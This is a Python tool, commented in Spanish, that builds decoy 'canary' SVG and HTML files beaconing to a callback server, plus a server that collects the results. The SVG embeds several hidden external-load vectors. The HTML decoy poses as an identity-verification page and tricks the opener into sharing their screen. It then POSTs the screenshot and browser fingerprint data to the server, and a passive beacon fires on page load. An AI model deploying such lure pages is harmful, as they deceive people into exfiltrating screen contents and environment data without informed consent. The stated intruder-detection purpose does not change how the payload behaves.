#!/usr/bin/env python3
"""
Canary Token Avanzado - SVG + HTML con captura de pantalla
===========================================================
Genera documentos señuelo que, al ser abiertos, envían evidencia forense
incluyendo captura de pantalla (si es posible) y métricas del entorno.

Uso:
    from canary_pro import AdvancedCanary
    canary = AdvancedCanary(callback_host="192.168.1.100:8001")
    # Generar un HTML con captura de pantalla
    canary.generate_html("informe_privado.html", capture_screen=True)
    # Generar un SVG mejorado
    canary.generate_svg("foto_2024.svg")
    canary.start_server()  # Puerto 8001
"""

import os
import json
import time
import secrets
import hashlib
import base64
import datetime
import pathlib
import http.server
import socketserver
import threading
import urllib.parse
from typing import Optional, Dict, List

class AdvancedCanary:
    def __init__(self, callback_host: str = "localhost:8001", callback_port: int = 8001):
        self.callback_host = callback_host
        self.callback_port = callback_port
        self.tokens: Dict[str, dict] = {}
        self.alerts: List[dict] = []
        self._server = None
        self._thread = None
        self._screenshot_dir = pathlib.Path(__file__).parent / "evidence" / "screenshots"
        self._screenshot_dir.mkdir(parents=True, exist_ok=True)

    # ──────────────────────── SVG MEJORADO ──────────────────────────
    def generate_svg(self, output_path: str, filename: str = None) -> dict:
        """Genera un SVG con múltiples vectores de callback y detección de sandbox."""
        token = "SVGCANARY_" + secrets.token_hex(12)
        fname = filename or pathlib.Path(output_path).name

        meta = {
            "token": token,
            "filename": fname,
            "path": str(output_path),
            "created": datetime.datetime.utcnow().isoformat() + "Z",
            "type": "svg",
            "callback_url": f"http://{self.callback_host}/canary/svg?token={token}",
        }
        self.tokens[token] = meta

        # SVG con:
        # - 3 imágenes ocultas (cada una con un parámetro distinto) para detectar renderizado parcial
        # - CSS @import para detectar si el renderizador aplica estilos
        # - un temporizador interno (para medir tiempos de carga)
        svg = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="800" height="600" viewBox="0 0 800 600">
  <!-- Fondo: simula un escritorio de trabajo -->
  <rect width="800" height="600" fill="#2b2b2b"/>
  <rect x="50" y="50" width="700" height="400" rx="10" fill="#fff" stroke="#555" stroke-width="2"/>
  <text x="400" y="120" text-anchor="middle" font-family="Arial" font-size="28" fill="#333">Informe Confidencial</text>
  <text x="400" y="160" text-anchor="middle" font-family="Arial" font-size="16" fill="#666">Para fines de auditoría interna</text>
  <rect x="100" y="200" width="600" height="150" rx="8" fill="#f9f9f9" stroke="#ccc"/>
  <text x="120" y="240" font-family="monospace" font-size="14" fill="#444">🔒 Documento protegido por SourceSeal</text>
  <text x="120" y="270" font-family="monospace" font-size="14" fill="#444">📅 Fecha: {datetime.datetime.now().strftime("%d/%m/%Y")}</text>
  <text x="120" y="300" font-family="monospace" font-size="14" fill="#444">🛡️ Hash: {secrets.token_hex(8)}</text>

  <!-- CANARY VECTOR 1: image (carga externa) -->
  <image x="0" y="0" width="1" height="1" preserveAspectRatio="none"
         xlink:href="http://{self.callback_host}/canary/svg?token={token}&v=img"/>

  <!-- CANARY VECTOR 2: style @import -->
  <style>
    @import url("http://{self.callback_host}/canary/svg?token={token}&v=css");
  </style>

  <!-- CANARY VECTOR 3: foreignObject con img -->
  <foreignObject x="0" y="0" width="1" height="1">
    <html xmlns="http://www.w3.org/1999/xhtml">
      <body style="margin:0;padding:0;">
        <img src="http://{self.callback_host}/canary/svg?token={token}&v=fo" width="1" height="1"/>
      </body>
    </html>
  </foreignObject>

  <!-- CANARY VECTOR 4: use element con xlink:href a imagen externa -->
  <use href="http://{self.callback_host}/canary/svg?token={token}&v=use" x="0" y="0" width="1" height="1"/>

  <!-- CANARY VECTOR 5: animación que dispara petición al finalizar (algunos renderers) -->
  <rect x="0" y="0" width="1" height="1" fill="transparent">
    <animate attributeName="opacity" values="0;0" dur="1s" repeatCount="1"
             begin="0s" fill="freeze"/>
  </rect>
</svg>'''

        pathlib.Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        pathlib.Path(output_path).write_text(svg, encoding="utf-8")
        meta["sha256"] = hashlib.sha256(svg.encode()).hexdigest()
        meta["size"] = len(svg.encode())
        return meta

    # ──────────────────── HTML CON CAPTURA DE PANTALLA ────────────────────
    def generate_html(self, output_path: str, filename: str = None, capture_screen: bool = True) -> dict:
        """
        Genera un documento HTML camuflado que intenta capturar pantalla.
        Si el usuario concede permisos, envía la captura en base64 al servidor.
        """
        token = "HTMLCANARY_" + secrets.token_hex(12)
        fname = filename or pathlib.Path(output_path).name

        meta = {
            "token": token,
            "filename": fname,
            "path": str(output_path),
            "created": datetime.datetime.utcnow().isoformat() + "Z",
            "type": "html",
            "callback_url": f"http://{self.callback_host}/canary/html?token={token}",
        }
        self.tokens[token] = meta

        # Generamos un HTML que parece una página de inicio de sesión o informe
        html_template = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Informe de Seguridad</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .container {{ background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 500px; text-align: center; }}
        .logo {{ font-size: 48px; margin-bottom: 20px; }}
        h1 {{ color: #1a1a1a; }}
        .sub {{ color: #666; margin-bottom: 30px; }}
        .btn {{ background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-size: 16px; }}
        .btn:hover {{ background: #0056b3; }}
        .footer {{ margin-top: 30px; font-size: 12px; color: #999; }}
    </style>
</head>
<body>
    <div class="container" id="content">
        <div class="logo">🔐</div>
        <h1>Verificación de Identidad</h1>
        <p class="sub">Para continuar con el acceso al documento, necesitamos confirmar su entorno de trabajo.</p>
        <button class="btn" id="captureBtn">Compartir pantalla para verificación</button>
        <div class="footer">Powered by SourceSeal · Auditoría continua</div>
    </div>

    <script>
        // Carga la librería html2canvas para fallback
        function loadScript(src) {{
            return new Promise((resolve, reject) => {{
                const s = document.createElement('script');
                s.src = src;
                s.onload = resolve;
                s.onerror = reject;
                document.head.appendChild(s);
            }});
        }}

        async function sendScreenshot(imageData, type = 'screen') {{
            try {{
                const response = await fetch('http://{self.callback_host}/canary/html?token={token}&v=' + type, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        image: imageData,
                        userAgent: navigator.userAgent,
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        language: navigator.language,
                        plugins: Array.from(navigator.plugins).map(p => p.name),
                        timestamp: new Date().toISOString()
                    }})
                }});
            }} catch (e) {{
                console.error('Error al enviar captura:', e);
            }}
        }}

        document.getElementById('captureBtn').addEventListener('click', async function() {{
            // Intento 1: getDisplayMedia (captura de pantalla real)
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {{
                try {{
                    const stream = await navigator.mediaDevices.getDisplayMedia({{ video: true, audio: false }});
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    const bitmap = await imageCapture.grabFrame();
                    const canvas = document.createElement('canvas');
                    canvas.width = bitmap.width;
                    canvas.height = bitmap.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(bitmap, 0, 0);
                    const dataUrl = canvas.toDataURL('image/png');
                    // Enviar captura
                    await sendScreenshot(dataUrl, 'screen');
                    track.stop();
                    alert('✅ Verificación completada. Gracias.');
                    return;
                }} catch (err) {{
                    console.warn('getDisplayMedia falló:', err);
                }}
            }}

            // Intento 2: html2canvas (captura del contenido del documento)
            try {{
                await loadScript('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js');
                const canvas = await html2canvas(document.body, {{
                    scale: 0.8,
                    useCORS: true,
                    logging: false
                }});
                const dataUrl = canvas.toDataURL('image/png');
                await sendScreenshot(dataUrl, 'html2canvas');
                alert('✅ Captura de documento enviada.');
            }} catch (err) {{
                console.warn('html2canvas falló:', err);
                // Intento 3: enviar solo metadatos
                await sendScreenshot(null, 'metadata');
                alert('⚠️ No se pudo capturar pantalla. Se enviaron metadatos.');
            }}
        }});

        // Si el usuario abre el HTML y no hace clic, igualmente se dispara un callback pasivo
        // (carga una imagen de 1x1 al cargar la página)
        (function passive() {{
            const img = new Image();
            img.src = 'http://{self.callback_host}/canary/html?token={token}&v=passive';
            img.style.display = 'none';
            document.body.appendChild(img);
        }})();
    </script>
</body>
</html>'''

        pathlib.Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        pathlib.Path(output_path).write_text(html_template, encoding="utf-8")
        meta["sha256"] = hashlib.sha256(html_template.encode()).hexdigest()
        meta["size"] = len(html_template.encode())
        return meta

    # ──────────────────── SERVIDOR HTTP (Manejo de callbacks) ────────────────────
    def _handle_request(self, handler):
        from http.server import BaseHTTPRequestHandler
        parsed = urllib.parse.urlparse(handler.path)
        if parsed.path.startswith("/canary/svg"):
            return self._handle_svg_callback(handler, parsed)
        elif parsed.path.startswith("/canary/html"):
            return self._handle_html_callback(handler, parsed)
        return False

    def _handle_svg_callback(self, handler, parsed):
        params = urllib.parse.parse_qs(parsed.query)
        token = params.get("token", [None])[0]
        if token and token in self.tokens:
            alert = {
                "type": "svg_canary",
                "token": token,
                "ip": handler.client_address[0],
                "user_agent": handler.headers.get("User-Agent"),
                "vector": params.get("v", ["unknown"])[0],
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
            }
            self.alerts.append(alert)
            self._save_evidence(alert)
        self._send_pixel(handler)
        return True

    def _handle_html_callback(self, handler, parsed):
        params = urllib.parse.parse_qs(parsed.query)
        token = params.get("token", [None])[0]
        if handler.command == "POST":
            # Leer el body (puede ser grande por la imagen base64)
            content_length = int(handler.headers.get("Content-Length", 0))
            body = handler.rfile.read(content_length).decode("utf-8")
            try:
                data = json.loads(body)
            except:
                data = {"raw": body}
            # Guardar captura
            if token in self.tokens:
                img_data = data.get("image", "")
                if img_data and img_data.startswith("data:image"):
                    # Extraer el base64
                    b64 = img_data.split(",")[-1]
                    # Guardar como archivo PNG
                    timestamp = int(time.time()*1000)
                    screen_file = self._screenshot_dir / f"SCREEN_{token}_{timestamp}.png"
                    try:
                        with open(screen_file, "wb") as f:
                            f.write(base64.b64decode(b64))
                    except Exception as e:
                        pass
                alert = {
                    "type": "html_canary_screenshot",
                    "token": token,
                    "ip": handler.client_address[0],
                    "user_agent": handler.headers.get("User-Agent"),
                    "vector": params.get("v", ["unknown"])[0],
                    "metadata": data,
                    "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
                }
                self.alerts.append(alert)
                self._save_evidence(alert)
        else:  # GET (callback pasivo)
            if token in self.tokens:
                alert = {
                    "type": "html_canary_passive",
                    "token": token,
                    "ip": handler.client_address[0],
                    "user_agent": handler.headers.get("User-Agent"),
                    "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
                }
                self.alerts.append(alert)
                self._save_evidence(alert)
        self._send_pixel(handler)
        return True

    def _send_pixel(self, handler):
        handler.send_response(200)
        handler.send_header("Content-Type", "image/png")
        handler.send_header("Cache-Control", "no-store")
        handler.end_headers()
        # Pixel 1x1 transparente
        handler.wfile.write(bytes.fromhex(
            "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4"
            "890000000d49444154789c63000100000005000100b5c4b5c40b000000004945"
            "4e44ae426082"
        ))

    def _save_evidence(self, alert):
        evidence_dir = pathlib.Path(__file__).parent / "evidence"
        evidence_dir.mkdir(exist_ok=True)
        filename = evidence_dir / f"ALERT-{int(time.time()*1000)}.json"
        with open(filename, "w") as f:
            json.dump(alert, f, indent=2, ensure_ascii=False)

    def start_server(self):
        """Inicia el servidor HTTP en un hilo separado."""
        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.handle_request()
            def do_POST(self):
                self.handle_request()
            def handle_request(self):
                if not self._parent._handle_request(self):
                    self.send_response(404)
                    self.end_headers()
            def log_message(self, format, *args):
                pass  # Silenciar logs para no contaminar
        Handler._parent = self

        self._server = socketserver.TCPServer(("0.0.0.0", self.callback_port), Handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        print(f"🛰️  Servidor Canary escuchando en http://{self.callback_host}")

    def stop_server(self):
        if self._server:
            self._server.shutdown()
            self._server.server_close()

    def get_alerts(self):
        return self.alerts

    def clear_alerts(self):
        self.alerts = []


# ──────────────────────── EJEMPLO DE USO ─────────────────────────────
if __name__ == "__main__":
    canary = AdvancedCanary(callback_host="192.168.1.100:8001")
    canary.start_server()

    # Generar un SVG ligero
    meta_svg = canary.generate_svg("photo_decoy.svg")
    print(f"✅ SVG generado: {meta_svg['path']}")

    # Generar un HTML con captura de pantalla
    meta_html = canary.generate_html("informe_auditoria.html")
    print(f"✅ HTML generado: {meta_html['path']}")

    print("\n📡 Esperando callbacks... Presiona Ctrl+C para detener.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        canary.stop_server()
        print("\n🛑 Servidor detenido.")